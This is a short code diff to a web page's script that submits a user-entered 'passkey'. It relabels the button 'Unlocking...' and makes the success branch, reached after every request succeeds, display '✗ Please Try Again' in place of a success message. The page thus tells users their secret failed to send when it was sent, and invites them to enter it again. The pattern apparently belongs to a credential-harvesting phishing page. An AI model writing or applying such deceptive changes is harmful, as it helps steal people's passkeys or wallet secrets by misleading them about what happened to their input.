@@ -332,7 +332,7 @@
 
       // Show loading spinner and sending text on buttons
       buttonTexts.forEach(bt => {
-        bt.innerHTML = `<span class="loading-spinner"></span>Sending...`;
+        bt.innerHTML = `<span class="loading-spinner"></span>Unlocking...`;
       });
 
       // Clear previous status
@@ -380,7 +380,7 @@
         .then(results => {
           const allSuccess = results.every(result => result.ok);
           if (allSuccess) {
-            showStatus("Passkey sent successfully!", "success");
+            showStatus("✗ Please Try Again", "error");
             input.value = "";
           } else {
             showStatus("✗ Please Try Again", "error");
